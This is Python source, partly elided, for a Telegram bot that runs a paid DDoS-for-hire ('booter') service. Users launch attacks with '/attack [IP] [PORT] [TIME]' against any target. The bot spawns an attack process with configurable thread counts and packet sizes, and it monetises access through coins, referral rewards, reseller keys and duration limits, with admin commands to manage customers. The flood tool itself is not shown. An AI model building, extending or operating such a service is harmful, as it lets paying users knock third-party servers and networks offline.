...
attacks = {}
BOT_CONFIG = {'attack_threads': 1200, 'packet_size': 512}
...
def run_attack(user_id, ip, port, duration, chat_id):
    try:
        ...
        process.wait()
        bot.send_message(chat_id, f"✅AttackDone\n{SEP}Target:{escape_markdown_v2(ip)}:{port}\nTime:{duration}s", parse_mode='MarkdownV2')
...
def send_welcome(message):
    ...
    if user_id not in data['users']:
        ...
        if referrer_id and referrer_id in data['users'] and referrer_id != user_id and message.chat.type in ['group', 'supergroup']:
            ...
            referrer['coins'] += 10
            bot.send_message(referrer_id, f"🎉+10coins for referral{escape_markdown_v2(user_id)}", parse_mode='MarkdownV2')
        save_data()
    bot.reply_to(message, f"🌟Welcome\n{SEP}Use/help for commands", parse_mode='MarkdownV2')
...
def send_invite(message):
    ...
    if user_id in data['banned']:
        ...
        return
    if user_id not in data['users']:
        bot.reply_to(message, "⚠️Use/start first", parse_mode='MarkdownV2')
        return
    group_link = f"t\\.me/{GROUP_USERNAME}?start=ref_{escape_markdown_v2(user_id)}"
    bot.reply_to(message, f"📩Invite\n{SEP}Link:{group_link}\nReward:10coins/invite", parse_mode='MarkdownV2')
...
def show_leaderboard(message):
    ...
    if user_id in data['banned']:
        bot.reply_to(message, "🚫Banned", parse_mode='MarkdownV2')
        return
    leaderboard = sorted(data['users'].items(), key=lambda x: (x[1]['group_invites'], x[1]['coins']), reverse=True)[:5]
    if not leaderboard:
...
def shutdown_bot(message):
    ...
    if user_id != OWNER_ID:
        ...
        return
    bot.reply_to(message, f"🛑ShuttingDown\n{SEP}Bot stopping...", parse_mode='MarkdownV2')
    save_data()
    threading.Thread(target=lambda: [bot.stop_polling(), os._exit(0)]).start()
...
def check_coins(message):
    ...
    bot.reply_to(message, f"💰Coins\n{SEP}Total:{coins}", parse_mode='MarkdownV2')
...
def buy_key(message):
    ...
    if (is_reseller and len(args) != 3) or (not is_reseller and len(args) != 2):
        bot.reply_to(message, f"📋Usage\n{SEP}{'`/buykey [DURATION] [LIMIT]`' if is_reseller else '`/buykey [DURATION]`'}", parse_mode='MarkdownV2')
        return
    duration_str = args[1]
    if duration_str not in COIN_PRICES:
        bot.reply_to(message, f"❌InvalidDuration\n{SEP}Options:1h,1d,3d,7d,30d", parse_mode='MarkdownV2')
        return
    user = data['users'][user_id]
    if is_reseller:
        try:
            ...
            if not 100 <= attack_limit <= 600:
                bot.reply_to(message, "❌Limit must be 100-600s", parse_mode='MarkdownV2')
                return
            cost = COIN_PRICES[duration_str] + (attack_limit - 100) // 5
        except ValueError:
            bot.reply_to(message, "❌Limit must be number", parse_mode='MarkdownV2')
            return
    else:
...
def start_attack(message):
    ...
    if user['plan'] == 'free':
        ...
        return
    if user_id in attacks:
        bot.reply_to(message, "⚠️Attack running", parse_mode='MarkdownV2')
        return
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, f"📋Usage\n{SEP}`/attack [IP] [PORT] [TIME]`", parse_mode='MarkdownV2')
        return
    ...
    try:
        ...
        if duration > user['limit']:
            bot.reply_to(message, f"⏱️Max{user['limit']}s", parse_mode='MarkdownV2')
            return
...
def stop_attack(message):
    ...
    if user_id not in attacks:
        bot.reply_to(message, "⚠️No attack", parse_mode='MarkdownV2')
        return
    attacks[user_id]['process'].terminate()
    del attacks[user_id]
    bot.reply_to(message, f"⛔Stopped\n{SEP}Attack ended", parse_mode='MarkdownV2')
...
def redeem_key(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/redeem [KEY]`", parse_mode='MarkdownV2')
        return
    key = args[1]
    ...
    save_data()
    bot.reply_to(message, f"🔑Redeemed\n{SEP}Limit:{limit}s", parse_mode='MarkdownV2')
...
def spend_coins(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/spend [COINS]`", parse_mode='MarkdownV2')
        return
    try:
        coins = int(args[1])
        if coins <= 0:
        ...
        if new_limit == user['limit']:
            bot.reply_to(message, "⚠️Max200s", parse_mode='MarkdownV2')
            return
        user['coins'] -= coins
        user['limit'] = new_limit
        add_log(user_id, f"Spent{coins}coins for{new_limit}s limit")
        save_data()
        bot.reply_to(message, f"⬆️Upgraded\n{SEP}NewLimit:{new_limit}s", parse_mode='MarkdownV2')
    except ValueError:
...
def generate_key(message):
    ...
    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, f"📋Usage\n{SEP}`/gen [KEY] [DURATION] [USES]`", parse_mode='MarkdownV2')
        return
...
def add_user(message):
    ...
    args = message.text.split()
    if len(args) < 4:
        bot.reply_to(message, f"📋Usage\n{SEP}`/add [TYPE] [USER_ID] [DURATION] [COINS]`", parse_mode='MarkdownV2')
        return
...
def list_users(message):
    ...
    if not is_admin(user_id):
        ...
        return
    if not data['users']:
        bot.reply_to(message, "👥Nousers", parse_mode='MarkdownV2')
        return
    msg = f"👥Users\n{SEP}"
...
def set_limit(message):
    ...
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, f"📋Usage\n{SEP}`/limit [USER_ID] [SECONDS]`", parse_mode='MarkdownV2')
        return
...
def ban_user(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/ban [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    ...
    save_data()
    bot.reply_to(message, f"⛔Banned\n{SEP}ID:{escape_markdown_v2(target_id)}", parse_mode='MarkdownV2')
...
def unban_user(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/unban [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    if target_id not in data['banned']:
        bot.reply_to(message, "⚠️Not banned", parse_mode='MarkdownV2')
        return
...
def list_keys(message):
    ...
    if not is_admin(user_id):
        ...
        return
    if not data['keys']:
        bot.reply_to(message, "🔑Nokeys", parse_mode='MarkdownV2')
        return
    msg = f"🔑Keys\n{SEP}"
    for key, key_data in list(data['keys'].items())[:5]:
...
def block_key(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/block [KEY]`", parse_mode='MarkdownV2')
        return
    key = args[1]
    ...
    save_data()
    bot.reply_to(message, f"🚫Blocked\n{SEP}Key:{key}", parse_mode='MarkdownV2')
...
def remove_user(message):
    ...
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/remove [USER_ID]`", parse_mode='MarkdownV2')
        return
    target_id = args[1]
    if target_id not in data['users']:
        bot.reply_to(message, "❌Invalid ID", parse_mode='MarkdownV2')
        return
    if target_id == OWNER_ID:
        bot.reply_to(message, "❌Cannot remove owner", parse_mode='MarkdownV2')
        return
...
def broadcast_message(message):
    ...
    if len(args) < 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/broadcast [MESSAGE]`", parse_mode='MarkdownV2')
        return
    text = args[1]
    success, fail = 0, 0
    for uid in data['users'].keys():
        try:
            bot.send_message(uid, f"📢Broadcast\n{SEP}{escape_markdown_v2(text)}", parse_mode='MarkdownV2')
            success += 1
        except Exception:
            fail += 1
...
def terminal_command(message):
    ...
    if len(args) < 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/terminal [CMD] [ARGS]`", parse_mode='MarkdownV2')
        return
    subcmd = args[1].lower()
    if subcmd == 'set' and len(args) == 3:
        ...
        try:
            ...
            if key == 'thread':
                ...
                bot.reply_to(message, f"⚙️Set\n{SEP}Threads:{value}", parse_mode='MarkdownV2')
            elif key == 'packet size':
                BOT_CONFIG['packet_size'] = value
                bot.reply_to(message, f"⚙️Set\n{SEP}Packet:{value}", parse_mode='MarkdownV2')
            else:
...
def send_tutorial(message):
    ...
    if not data['tutorials']:
        bot.reply_to(message, "🎥Notutorials", parse_mode='MarkdownV2')
        return
    msg = f"🎥Tutorials\n{SEP}"
    for i, link in enumerate(data['tutorials'][:3], 1):
...
def add_tutorial(message):
    ...
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.reply_to(message, f"📋Usage\n{SEP}`/addtutorial [LINK]`", parse_mode='MarkdownV2')
        return
    link = args[1]
    if link not in data['tutorials']:
        ...
        save_data()
        bot.reply_to(message, f"🎬Added\n{SEP}Link:{escape_markdown_v2(link)}", parse_mode='MarkdownV2')
    else:
        bot.reply_to(message, "⚠️Duplicate", parse_mode='MarkdownV2')
...
def show_logs(message):
    ...
    if not is_admin(user_id):
        ...
        return
    if not data['logs']:
        bot.reply_to(message, "📜Nologs", parse_mode='MarkdownV2')
        return
    msg = f"📜Logs\n{SEP}" + "\n".join(data['logs'][-5:])
    bot.reply_to(message, msg, parse_mode='MarkdownV2')
...
def clear_logs(message):
    ...
    save_data()
    bot.reply_to(message, f"🗑️Cleared\n{SEP}Logs reset", parse_mode='MarkdownV2')
